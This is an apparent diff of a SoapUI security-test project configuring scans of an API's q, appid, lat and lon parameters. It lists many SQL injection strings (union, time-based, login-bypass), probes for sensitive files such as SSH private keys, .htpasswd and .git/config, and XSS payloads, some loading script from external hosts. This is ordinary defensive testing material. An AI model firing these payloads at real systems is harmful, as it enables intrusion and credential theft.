+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 14--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>" or sleep(5)="</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' or true--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 28</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>/*…*/</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>")) or (("x"))=(("x</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 21#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin" --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>' UNION SELECT sum(columnname ) from tablename --</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>')) or (('x'))=(('x</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 29</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'&amp;'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 7--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR 3409=3409 AND ('pytW' LIKE 'pytY</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>and (select substring(@@version,1,1))='X'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>benchmark(50000000,MD5(1))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>OR 3409=3409 AND ('pytW' LIKE 'pytW</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 7#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT NULL#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>") or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=1--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or benchmark(50000000,MD5(1))</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 31337#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>';WAITFOR DELAY '0:0:30'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>HAVING 1=0</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>HAVING 1=1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>WHERE 1=1 AND 1=0</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 24--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>WHERE 1=1 AND 1=1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>||</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),3</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 24</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>WHERE 1=1 AND 1=1#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>pg_SLEEP(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin") or ("1"="1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 25</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'*'</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 12--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 7506=9091 AND (5913=5913</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>'=0--+</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>WHERE 1=1 AND 1=0#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 9#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 26</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin') or ('1'='1'--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin') or '1'='1</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin" #</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 9--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>1 or sleep(5)#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>ORDER BY 27</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>benchmark(10000000,MD5(1))#</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>') or sleep(5)='</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>HAVING 1=1--</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>or pg_SLEEP(5)</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>admin') or ('1'='1'/*</con:sqlInjectionStrings>
+        <con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6</con:sqlInjectionStrings>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="dc9a77af-9b22-4cba-8c88-0d5db2e99e0d" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true">
+        <con:parameters label="q" parameterName="q" xpath="" checked="true"/>
+        <con:parameters label="appid" parameterName="appid" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityProScan type="SensitiveFileSecurityScan" name="Sensitive Files Exposure" id="11c443ce-337d-4d9a-bbee-4c2fe5edf273" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:type="con:SensitiveFileSecurityScan">
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/known_hosts"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/authorized_keys"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.bak"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa.old"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_dsa~"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.bak"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa.old"/>
+        <con:sensitiveFile description="Sensitive SSH information" fileName="/.ssh/id_rsa~"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.bak"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess.old"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/htaccess.txt"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htaccess~"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.bak"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd.old"/>
+        <con:sensitiveFile description="May contain passwords or other sensitive information" fileName="/.htpasswd~"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bash_history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.bashrc"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.profile"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/.mysql_history"/>
+        <con:sensitiveFile description="Usually reside in a users home directory on a Linux/UNIX machine" fileName="/~root"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/config"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/HEAD"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.git/index"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/entries"/>
+        <con:sensitiveFile description="Contains info from SCM (git, svn...)" fileName="/.svn/wc.db"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/pccsmysqladm/incs/dbconnect.inc"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/perl/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/phpBB/phpinfo.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/weblogic"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-admin/wp-login.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/wp-content/debug.log"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/WEB-INF/web.xml"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iisadmin/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/iissamples/"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.jsp"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.php"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.bak"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html.old"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/index.html~"/>
+        <con:sensitiveFile description="May tell what type of web server is hosting the service" fileName="/manager"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/database.yml"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/config/initializers/secret_token.rb"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/seeds.rb"/>
+        <con:sensitiveFile description="May exist if Ruby on Rails is used on the server" fileName="/db/development.sqlite3"/>
+      </con:config>
+      <con:assertion type="Sensitive Files Exposure Assertion" id="c22655ca-c636-48c7-b3d2-48139027b689" name="Sensitive Files Exposure"/>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true"/>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="WeakAuthenticationScan" name="Weak Authentication" id="97065c1a-6d03-40ca-a843-2fe7ad3cc69e" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:nil="true"/>
+      <con:assertion type="WeakPassword" id="992d62eb-cc09-4978-ab89-92eac5206973" name="Weak Password Detection">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="BasicAuth" id="5bb9d4df-22a8-461b-bb00-ba55ad41b859" name="Basic Authentication Detection"/>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true"/>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+    <con:testStepSecurityProScan type="HttpMethodFuzzingScan" name="HTTP Method Fuzzing" id="221f9e22-b59c-4643-99e6-3dbb11cdc0a6" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:type="con:HttpMethodFuzzingScan">
+        <con:deselectedMethods/>
+      </con:config>
+      <con:assertion type="Sensitive Information Exposure" id="845a4034-72c1-4e86-ad69-b58a091f4649" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:assertion type="Valid HTTP Status Codes" id="05076d11-8cee-4393-bf74-62a7e1bf1efa" name="Valid HTTP Status Codes">
+        <con:settings>
+          <con:setting id="__LEVEL_">WARNING</con:setting>
+        </con:settings>
+        <con:configuration>
+          <codes>501,405,403</codes>
+        </con:configuration>
+      </con:assertion>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true"/>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityProScan>
+  </con:testStepSecurityTest>
+  <con:testStepSecurityTest>
+    <con:testStepId>95efe3c6-90a7-47d6-a552-a7f31532347b</con:testStepId>
+    <con:testStepSecurityScan type="BoundaryScan" name="Boundary Scan" id="86f9d76c-3797-4a27-8712-4835e39581f2" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:nil="true"/>
+      <con:assertion type="Sensitive Information Exposure" id="b9ab0f7a-0fbb-4c83-a7b2-a318c7c741e2" name="Sensitive Information Exposure">
+        <con:configuration/>
+      </con:assertion>
+      <con:testStep xsi:nil="true"/>
+      <con:checkedParameters xsi:nil="true">
+        <con:parameters label="lon" parameterName="lon" xpath="" checked="true"/>
+        <con:parameters label="appid" parameterName="appid" xpath="" checked="true"/>
+        <con:parameters label="lat" parameterName="lat" xpath="" checked="true"/>
+      </con:checkedParameters>
+      <con:executionStrategy xsi:nil="true">
+        <con:strategy>ONE_BY_ONE</con:strategy>
+        <con:delay>100</con:delay>
+      </con:executionStrategy>
+    </con:testStepSecurityScan>
+    <con:testStepSecurityScan type="CrossSiteScriptingScan" name="Cross Site Scripting" id="1936f3b9-28f9-496c-9f6a-77a3d95888b1" applyForFailedStep="false" disabled="false">
+      <con:settings/>
+      <con:config xsi:type="con:CrossSiteScriptingScan">
+        <con:parameterExposureStrings>&lt;PLAINTEXT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//-->&lt;/SCRIPT>">'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>'';!--"&lt;XSS>=&amp;{()}</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js>&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=JaVaScRiPt:alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG """>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings><![CDATA[<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>]]></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav	ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x09;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0A;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="jav&amp;#x0D;ascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>perl -e 'print "&lt;IMG SRC=java\0script:alert(\"XSS\")>";' > out</con:parameterExposureStrings>
+        <con:parameterExposureStrings>perl -e 'print "&lt;SCR\0IPT>alert(\"XSS\")&lt;/SCR\0IPT>";' > out</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC=" &amp;#14;  javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT/XSS SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert("XSS")></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT/SRC="http://soapui.org/xss.js">&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;&lt;SCRIPT>alert("XSS");//&lt;&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=http://soapui.org/xss.js?&lt;B></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT SRC=//ha.ckers.org/.j></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG SRC="javascript:alert('XSS')"</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;iframe src=http://soapui.org/scriptlet.html &lt;</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;SCRIPT>a=/XSS/alert(a.source)&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>\";alert('XSS');//</con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;/TITLE>&lt;SCRIPT>alert("XSS");&lt;/SCRIPT></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY BACKGROUND="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;BODY ONLOAD=alert('XSS')></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG DYNSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
+        <con:parameterExposureStrings>&lt;IMG LOWSRC="javascript:alert('XSS')"></con:parameterExposureStrings>
